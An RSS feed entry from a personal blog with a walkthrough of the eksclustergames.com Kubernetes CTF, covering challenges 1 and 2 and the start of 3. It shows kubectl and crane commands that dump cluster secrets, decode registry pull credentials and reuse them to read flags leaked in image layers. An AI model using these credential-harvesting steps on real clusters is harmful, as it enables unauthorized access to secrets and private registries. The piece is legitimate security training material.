<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title><![CDATA[sontek's blog]]></title>
        <description><![CDATA[Blog about SRE, Kubernetes, Python, GoLang, and anything development related.]]></description>
        <link>https://sontek.net</link>
        <image>
            <url>https://sontek.net/logo.png</url>
            <title>sontek&apos;s blog</title>
            <link>https://sontek.net</link>
        </image>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 07 Nov 2023 23:54:18 GMT</lastBuildDate>
        <atom:link href="https://sontek.net/rss.xml" rel="self" type="application/rss+xml"/>
        <pubDate>Tue, 07 Nov 2023 23:54:17 GMT</pubDate>
        <copyright><![CDATA[All rights reserved 2023, @sontek]]></copyright>
        <item>
            <title><![CDATA[eksclustergames.com walk through!]]></title>
            <description><![CDATA[<p><a href="https://eksclustergames.com">eksclustergames.com</a> is a new CTF targetted at
kubernetes vulnerabilities. This is a walk through on how to solve the issues.</p>
<h1>Challenge 1</h1>
<p>The first challenge starts off with a clue:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">Jumpstart your quest by listing all the secrets in the cluster.</span></span>
<span data-line=""><span style="color: #adbac7">Can you spot the flag among them?</span></span></code></pre></div>
<p>So lets start off by getting the secrets:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">TYPE</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">DATA</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">log-rotate</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Opaque</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7">      </span><span style="color: #6CB6FF">37</span><span style="color: #96D0FF">h</span></span></code></pre></div>
<p>Since there is only one, lets view it!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"items"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">        {</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"data"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"flag"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ=="</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Secret",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"creationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:02:08Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"name"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"log-rotate",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"namespace"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"challenge1",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"890951",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"uid"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"03f6372c-b728-4c5b-ad28-70d5af8d387c"</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Opaque"</span></span>
<span data-line=""><span style="color: #ADBAC7">        }</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"List",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">""</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>The flag seems to be in <code>.items[0].data.flag</code> and is <code>base64</code> encoded so we can
decode it as well:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].data.flag'</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-r</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span></span>
<span data-line=""><span style="color: #F69D50">wiz_eks_challenge</span><span style="color: #ADBAC7">{omg_over_privileged_*REDACTED*}</span></span></code></pre></div>
<p>First flag found!</p>
<p>This one was definitely a softball but it gets you nice and warmed up on the
platform.</p>
<h1>Challenge 2</h1>
<p>The hint for this challenge is:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">A thing we learned during our research: always check the container registries.</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">For your convenience, the crane utility is already pre-installed on the machine.</span></span></code></pre></div>
<p>The first thing I think of when reading this is that it has something to do
with the registry a pod is living on.   So lets list the pods and see what is
available:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">RESTARTS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">database-pod-2c9b3a4e</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">36</span><span style="color: #96D0FF">h</span></span></code></pre></div>
<p>With only one pod as a target, lets get the image for it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].spec.containers[0].image'</span></span>
<span data-line=""><span style="color: #F69D50">"eksclustergames/base_ext_image"</span></span></code></pre></div>
<p>So its on standard <code>docker.io</code> registry instead of a private one like I was
expecting from the clue.   The second hint was that crane is on the system so
lets use that to pull the image and inspect it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eksclustergames/base_ext_image</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #F69D50">Error:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">fetching</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">reading</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">image</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"eksclustergames/base_ext_image":</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">GET</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">UNAUTHORIZED:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authentication</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">required</span><span style="color: #ADBAC7">; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]</span></span></code></pre></div>
<p>Which means this is a private image and we are going to need to get some
credentials to an account that has access to this image. Usually you have to
define a secret for kubernetes to be able to pull from private registries and
since we started off with a secret test first that is where I'm going to go
next:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].spec.imagePullSecrets'</span></span>
<span data-line=""><span style="color: #ADBAC7">[</span></span>
<span data-line=""><span style="color: #ADBAC7">  {</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">"name"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"registry-pull-secrets-780bab1d"</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">]</span></span></code></pre></div>
<p>So that is the secret we need, lets view it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">registry-pull-secrets-780bab1d</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.data.".dockerconfigjson"'</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-r</span><span style="color: #F47067">|</span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"auths"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"index.docker.io/v1/"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"auth"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ZWtzY2x1c3RlcmdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZUWo4RnVDbw=="</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Looks like we've got some more base64 decoding for the actual auth credentials:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw=="</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span></span>
<span data-line=""><span style="color: #F69D50">eksclustergames:dckr&#x3C;*REDACTED*></span></span></code></pre></div>
<p>So now we can login with <code>crane auth</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">login</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-u</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eksclustergames</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-p</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">dckr</span><span style="color: #F47067">&#x3C;</span><span style="color: #6CB6FF">*</span><span style="color: #96D0FF">REDACTED</span><span style="color: #F47067">*></span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">docker.io</span></span>
<span data-line=""><span style="color: #F69D50">2023/11/03</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">02</span><span style="color: #96D0FF">:35:49</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">logged</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">in</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">via</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/home/user/.docker/config.json</span></span></code></pre></div>
<p>So if we try to view the image again it should work!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eksclustergames/base_ext_image</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"architecture"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"amd64",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"config"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Env"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Cmd"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"/bin/sleep"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"3133337"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"ArgsEscaped"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span><span style="color: #96D0FF">,</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"OnBuild"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">null</span></span>
<span data-line=""><span style="color: #ADBAC7">  },</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:18.920734382Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"history"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.538571854Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.655005962Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop)  CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">sh</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:18.920734382Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' > /flag.txt # buildkit",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:18.920734382Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">/bin/sleep</span><span style="color: #F47067">\"</span><span style="color: #96D0FF"> </span><span style="color: #F47067">\"</span><span style="color: #96D0FF">3133337</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  ],</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"os"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"linux",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"rootfs"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"layers",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"diff_ids"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ]</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Looks like they leaked the secret right there in the image layers:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}'</span></span></code></pre></div>
<p>So lets submit that and move onto the next one!</p>
<h1>Challenge 3</h1>
<p>The hint is:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">A pod's image holds more than just code. Dive deep into its ECR repository,</span></span>
<span data-line=""><span style="color: #adbac7">inspect the image layers, and uncover the hidden secret.</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">Remember: You are running inside a compromised EKS pod.</span></span></code></pre></div>
<p>This sounds very similar to the last one but with the hints that its on ECR and
that we are in the pod itself it makes me believe we'll have something like IRSA
access to AWS from the pod and need to use that to get to it.</p>
<p>First lets check what pods we are working with:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                      </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">RESTARTS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">accounting-pod-876647f8</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">37</span><span style="color: #96D0FF">h</span></span></code></pre></div>
<p>So same as the last challenge, lets get the image and see what access we have:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].spec.containers[0].image'</span></span>
<span data-line=""><span style="color: #F69D50">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"</span></span></code></pre></div>
<p>Which as expected, we do not have access to:</p>
